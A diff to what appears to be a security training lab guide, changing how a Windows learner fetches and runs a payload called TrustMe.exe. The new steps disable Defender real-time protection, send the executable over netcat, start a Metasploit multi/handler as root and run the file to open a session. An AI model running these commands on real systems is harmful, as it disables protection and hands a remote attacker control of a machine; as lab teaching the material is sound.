@@ -14,7 +14,13 @@ Let’s get started by opening a Terminal as Administrator
 
 When you get the User Account Control Prompt, select Yes.
 
-And, open a Ubuntu command prompt:
+In the default powershell Window that opens, lets ensure that Defender is off;
+
+PS C:\Users\adhd> `Set-MpPreference -DisableRealtimeMonitoring $true`
+
+Please note, if you get red errors that say ` A general error occurred that is not covered by a more specific error code.` that is OK!  It means Defender was disabled.  We run above command to ensure that it is off for this lab.  It has a sneaky way of truning back on again..
+
+And now, open a Ubuntu command prompt:
 
 ![](attachments/Clipboard_2020-06-17-08-32-51.png)
 
@@ -44,14 +50,14 @@ Please note, the adhd password is adhd.
 
 /#`ls -l TrustMe.exe`
 
-/#`python -m SimpleHTTPServer 8000 &`
+/#`nc -l -p 2222 < TrustMe.exe`
 
-It should look like this:
+Now, let's start the Metasploit Handler.  You will have to open another Ubuntu command prompt by selecting the down carrot from the upper tabs on the Windows Terminal and selecting Ubuntu.
 
-![](attachments/Clipboard_2020-07-09-15-52-24.png)
+Let's become root first!!!
+$`sudo su -`
 
-Now, let's start the Metasploit Handler.  You will have to hit Enter to get your prompt back.
-
+Now, let's start the Metasploit handler.
 
 root@DESKTOP-I1T2G01:/tmp/# `msfconsole -q`
 msf5 > `use exploit/multi/handler`
@@ -65,20 +71,23 @@ It should look like this:
 
 ![](attachments/Clipboard_2020-06-12-12-46-10.png)
 
-Now, let’s surf to your Linux system, download the malware and run it!
+Now, let's open a Windows command prompt.  Simply select the down carrot from the Windows Terminal and select Command Prompt.
 
-Simply open an Edge browser to `http://<YOUR LINUX IP>:8000`
+Once the prompt is open, let's run the following commands to copy over and run the TrustMe.exe file.
 
-![](attachments/Clipboard_2020-07-09-15-54-29.png)
+`cd \tools`
 
-Remember! Your IP will be different!!
+`nc <Your Linux IP> 2222 > TrustMe.exe`
 
-Now, let's download and run the TrustMe.exe file!
+It should look like this:
 
-![](attachments/Clipboard_2020-07-09-15-55-05.png)
-You should simply click and run the program from the browser.
+![](attachments/TrustMe.png)
 
-If you get an alert, just select run the application.
+Take a deep breath.  Count to 5.  Then hit Ctrl+c to kill the connection.
+
+Then, run it.
+
+`TrustMe.exe`
 
 Back at your Ubuntu prompt, you should have a metasploit session.
 
